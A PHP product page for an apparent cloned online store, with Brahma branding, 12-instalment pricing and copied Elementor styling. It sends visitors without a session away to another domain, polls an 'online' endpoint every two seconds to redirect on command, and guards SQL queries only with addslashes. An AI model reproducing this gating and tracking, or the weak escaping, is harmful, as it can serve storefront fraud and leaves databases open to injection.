<?php 

session_start();

require_once("api/db.php");

if (!isset($_GET["produto"])) {
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}else{

$id = addslashes($_GET["produto"]);
$sqlx = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
if(mysqli_num_rows($sqlx) > 0){

if($_SESSION['session_index'] > time()){


$sql = mysqli_query($conn, "SELECT * from config");
while($row = mysqli_fetch_array($sql)){ 
$cor = $row["cor"];
$nome = $row["nome"];
}

############################          


$sql1 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
while($row1 = mysqli_fetch_array($sql1)){ 
$codigo = $row1["codigo"];
$nomeproduto = $row1["nome"];
$valor = $row1["valor"];
$img = $row1["img"];
$desconto = $row1["desconto"];
$descricao = $row1["descricao"];
}


$sql12 = mysqli_query($conn, "SELECT * from produto WHERE codigo='$id'");
while($row1 = mysqli_fetch_array($sql12)){ 
$id = $row1['id'];	
$cliques = $row1['cliques'];	
}
$novoclick = $cliques + 1;
$query = mysqli_query($conn, "UPDATE produto SET cliques='$novoclick' WHERE id='$id'");


$valor_total = $valor;
$qtde_parcelas = 12;
function parcelas($montante, $parcelas) {
$resultado = array();
$centavos = $montante * 100; 

array_push($resultado,(floor($centavos / $parcelas) + $centavos % $parcelas) / 100.0 );
for ($i = 1; $i < $parcelas; $i ++) {
array_push($resultado, floor($centavos / $parcelas)  / 100.0 );
}

return $resultado;
}
$parcela12 = parcelas($valor_total, $qtde_parcelas);

}else{
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}


}else{
session_destroy();
header("Location: https://www.lojavirtual.com.br/");
exit();
}

}

?>
<!DOCTYPE html>
<html lang="pt-BR">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta charset="UTF-8">
<title><?php echo $nomeproduto . " - " . time(); ?> </title>


<style>
img.wp-smiley,
img.emoji {
display: inline !important;
border: none !important;
box-shadow: none !important;
height: 1em !important;
width: 1em !important;
margin: 0 0.07em !important;
vertical-align: -0.1em !important;
background: none !important;
padding: 0 !important;
}
</style>

<style id='global-styles-inline-css'>
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}
.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
</style>
	<script src="./arquivos/jquery.js?fake7=<?php echo time();?>"></script>
 <script>
 setInterval(()=>{
$.post("api/",{api:"online", cliente:"produto"},function(retorno){
if(retorno==1){ window.location.href="https://www.lojavirtual.com.br/"; } else{ }
});
}, 2000);
 </script>
 
<link rel='stylesheet' id='wp-block-library-css' href='./arquivos/css2/style.min6a4d.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='classic-theme-styles-css' href='./arquivos/css2/classic-themes.min68b3.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CPoppins%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=auto&amp;ver=6.1.1' media='all' />
<link rel='stylesheet' id='elementor-icons-shared-0-css' href='./arquivos/css2/fontawesome.min52d5.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-solid-css' href='./arquivos/css2/solid.min52d5.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='./arquivos/css2/frontend-lite.min3088.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='elementor-global-css' href='./arquivos/css2/globalb5f3.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='elementor-post-11-css' href='./arquivos/css2/post-11e761.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='elementor-icons-css' href='./arquivos/css2/elementor-icons.min7816.css?ver=<?php echo time();?>' media='all' />
<link rel='stylesheet' id='hello-elementor-css' href='./arquivos/css2/style.minc141.css?ver=<?php echo time();?>' media='all' />
<link rel="stylesheet" href="./arquivos/css2/widget-icon-box.min.css?ver=<?php echo time();?>">	



<link rel="icon" href="./arquivos/brahma-150x150.png" sizes="32x32" />
<link rel="icon" href="./arquivos/brahma.png" sizes="192x192" />
<link rel="apple-touch-icon" href="./arquivos/brahma.png" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />

</head>




<body class="home page-template page-template-elementor_canvas page page-id-11 elementor-default elementor-template-canvas elementor-kit-7 elementor-page elementor-page-11">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.49803921568627" /><feFuncG type="table" tableValues="0 0.49803921568627" /><feFuncB type="table" tableValues="0 0.49803921568627" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.27843137254902" /><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.64705882352941" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.78039215686275 1" /><feFuncG type="table" tableValues="0 0.94901960784314" /><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.44705882352941 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.098039215686275 1" /><feFuncG type="table" tableValues="0 0.66274509803922" /><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg>		<div data-elementor-type="wp-page" data-elementor-id="11" class="elementor elementor-11">


<section style="background-color: <?php echo $cor;?> !important;" class="elementor-section elementor-top-section elementor-element elementor-element-62ac141d elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="62ac141d" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-2b55bb97" data-id="2b55bb97" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-7b442008 elementor-widget elementor-widget-heading" data-id="7b442008" data-element_type="widget" data-widget_type="heading.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-heading-title{padding:0;margin:0;line-height:1}.elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a{color:inherit;font-size:inherit;line-height:inherit}.elementor-widget-heading .elementor-heading-title.elementor-size-small{font-size:15px}.elementor-widget-heading .elementor-heading-title.elementor-size-medium{font-size:19px}.elementor-widget-heading .elementor-heading-title.elementor-size-large{font-size:29px}.elementor-widget-heading .elementor-heading-title.elementor-size-xl{font-size:39px}.elementor-widget-heading .elementor-heading-title.elementor-size-xxl{font-size:59px}</style><h2 class="elementor-heading-title elementor-size-default">PROIBIDO A VENDA PARA MENORES DE 18 ANOS!</h2>		</div>
</div>
</div>
</div>
</div>
</section>


<section class="elementor-section elementor-top-section elementor-element elementor-element-25dc59c4 elementor-hidden-tablet elementor-hidden-mobile elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="25dc59c4" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-16afe2c6" data-id="16afe2c6" data-element_type="column">
<div class="elementor-widget-wrap">
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-14aa22ed" data-id="14aa22ed" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-190581bf elementor-widget elementor-widget-image" data-id="190581bf" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-widget-image{text-align:center}.elementor-widget-image a{display:inline-block}.elementor-widget-image a img[src$=".svg"]{width:48px}.elementor-widget-image img{vertical-align:middle;display:inline-block}</style>												<img decoding="async" width="636" height="324" src="./arquivos/Sem-Titulo-3.png" class="attachment-full size-full" />															</div>
</div>
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-5ada27b" data-id="5ada27b" data-element_type="column">
<div class="elementor-widget-wrap">
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-603b19a4" data-id="603b19a4" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-1b2696d3 elementor-icon-list--layout-inline elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="1b2696d3" data-element_type="widget" data-widget_type="icon-list.default">
<div class="elementor-widget-container">
<style>/*! elementor - v3.6.1 - 23-03-2022 */
.elementor-widget.elementor-icon-list--layout-inline .elementor-widget-container{overflow:hidden}.elementor-widget .elementor-icon-list-items.elementor-inline-items{margin-right:-8px;margin-left:-8px}.elementor-widget .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item{margin-right:8px;margin-left:8px}.elementor-widget .elementor-icon-list-items.elementor-inline-items .elementor-icon-list-item:after{width:auto;left:auto;right:auto;position:relative;height:100%;border-top:0;border-bottom:0;border-right:0;border-left-width:1px;border-style:solid;right:-8px}.elementor-widget .elementor-icon-list-items{list-style-type:none;margin:0;padding:0}.elementor-widget .elementor-icon-list-item{margin:0;padding:0;position:relative}.elementor-widget .elementor-icon-list-item:after{position:absolute;bottom:0;width:100%}.elementor-widget .elementor-icon-list-item,.elementor-widget .elementor-icon-list-item a{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;font-size:inherit}.elementor-widget .elementor-icon-list-icon+.elementor-icon-list-text{-ms-flex-item-align:center;align-self:center;padding-left:5px}.elementor-widget .elementor-icon-list-icon{display:-webkit-box;display:-ms-flexbox;display:flex}.elementor-widget .elementor-icon-list-icon svg{width:var(--e-icon-list-icon-size,1em);height:var(--e-icon-list-icon-size,1em)}.elementor-widget .elementor-icon-list-icon i{width:1.25em;font-size:var(--e-icon-list-icon-size)}.elementor-widget.elementor-widget-icon-list .elementor-icon-list-icon{text-align:var(--e-icon-list-icon-align)}.elementor-widget.elementor-widget-icon-list .elementor-icon-list-icon svg{margin:var(--e-icon-list-icon-margin,0 calc(var(--e-icon-list-icon-size, 1em) * .25) 0 0)}.elementor-widget.elementor-list-item-link-full_width a{width:100%}.elementor-widget.elementor-align-center .elementor-icon-list-item,.elementor-widget.elementor-align-center .elementor-icon-list-item a{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-widget.elementor-align-center .elementor-icon-list-item:after{margin:auto}.elementor-widget.elementor-align-center .elementor-inline-items{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-widget.elementor-align-left .elementor-icon-list-item,.elementor-widget.elementor-align-left .elementor-icon-list-item a{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:left}.elementor-widget.elementor-align-left .elementor-inline-items{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.elementor-widget.elementor-align-right .elementor-icon-list-item,.elementor-widget.elementor-align-right .elementor-icon-list-item a{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:right}.elementor-widget.elementor-align-right .elementor-icon-list-items{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.elementor-widget:not(.elementor-align-right) .elementor-icon-list-item:after{left:0}.elementor-widget:not(.elementor-align-left) .elementor-icon-list-item:after{right:0}@media (max-width:1024px){.elementor-widget.elementor-tablet-align-center .elementor-icon-list-item,.elementor-widget.elementor-tablet-align-center .elementor-icon-list-item a,.elementor-widget.elementor-tablet-align-center .elementor-icon-list-items{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-widget.elementor-tablet-align-center .elementor-icon-list-item:after{margin:auto}.elementor-widget.elementor-tablet-align-left .elementor-icon-list-items{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.elementor-widget.elementor-tablet-align-left .elementor-icon-list-item,.elementor-widget.elementor-tablet-align-left .elementor-icon-list-item a{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:left}.elementor-widget.elementor-tablet-align-right .elementor-icon-list-items{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.elementor-widget.elementor-tablet-align-right .elementor-icon-list-item,.elementor-widget.elementor-tablet-align-right .elementor-icon-list-item a{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:right}.elementor-widget:not(.elementor-tablet-align-right) .elementor-icon-list-item:after{left:0}.elementor-widget:not(.elementor-tablet-align-left) .elementor-icon-list-item:after{right:0}}@media (max-width:767px){.elementor-widget.elementor-mobile-align-center .elementor-icon-list-item,.elementor-widget.elementor-mobile-align-center .elementor-icon-list-item a,.elementor-widget.elementor-mobile-align-center .elementor-icon-list-items{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center}.elementor-widget.elementor-mobile-align-center .elementor-icon-list-item:after{margin:auto}.elementor-widget.elementor-mobile-align-left .elementor-icon-list-items{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start}.elementor-widget.elementor-mobile-align-left .elementor-icon-list-item,.elementor-widget.elementor-mobile-align-left .elementor-icon-list-item a{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:left}.elementor-widget.elementor-mobile-align-right .elementor-icon-list-items{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end}.elementor-widget.elementor-mobile-align-right .elementor-icon-list-item,.elementor-widget.elementor-mobile-align-right .elementor-icon-list-item a{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:right}.elementor-widget:not(.elementor-mobile-align-right) .elementor-icon-list-item:after{left:0}.elementor-widget:not(.elementor-mobile-align-left) .elementor-icon-list-item:after{right:0}}</style>		<ul class="elementor-icon-list-items elementor-inline-items">
<li class="elementor-icon-list-item elementor-inline-item">
<span class="elementor-icon-list-icon">
<i aria-hidden="true" class="fas fa-truck"></i>						</span>
<span class="elementor-icon-list-text">Rastrear Pedido</span>
</li>
</ul>
</div>
</div>
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-2de3ba46" data-id="2de3ba46" data-element_type="column">
<div class="elementor-widget-wrap">
</div>
</div>
</div>
</section>




<section class="elementor-section elementor-top-section elementor-element elementor-element-1bfaa29b elementor-section-full_width elementor-hidden-desktop elementor-section-height-default elementor-section-height-default" data-id="1bfaa29b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
<div class="elementor-container elementor-column-gap-default">
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-22d2c257" data-id="22d2c257" data-element_type="column">
<div class="elementor-widget-wrap">
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-1fe16379" data-id="1fe16379" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-781339aa elementor-widget elementor-widget-image" data-id="781339aa" data-element_type="widget" data-widget_type="image.default">
<div class="elementor-widget-container">
<?php 
$f = "arquivos/logo/"; 
$i = glob($f . "*.png");

foreach($i as $im){
echo '<img decoding="async" width="636" height="324" src="'.$im.'" class="attachment-full size-full"/>';
}
?>
</div>




</div>
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-299c232c" data-id="299c232c" data-element_type="column">
<div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-387e3bf9 elementor-view-default elementor-widget elementor-widget-icon" data-id="387e3bf9" data-element_type="widget" data-widget_type="icon.default">
<div class="elementor-widget-container">
<div class="elementor-icon-wrapper">
<a class="elementor-icon" href="#">
<i aria-hidden="true" class="fas fa-truck"></i>			</a>
</div>
</div>
</div>
</div>
</div>
<div class="elementor-column elementor-col-20 elementor-top-column elementor-element elementor-element-6d0f6209" data-id="6d0f6209" data-element_type="column">
<div class="elementor-widget-wrap">
</div>
</div>
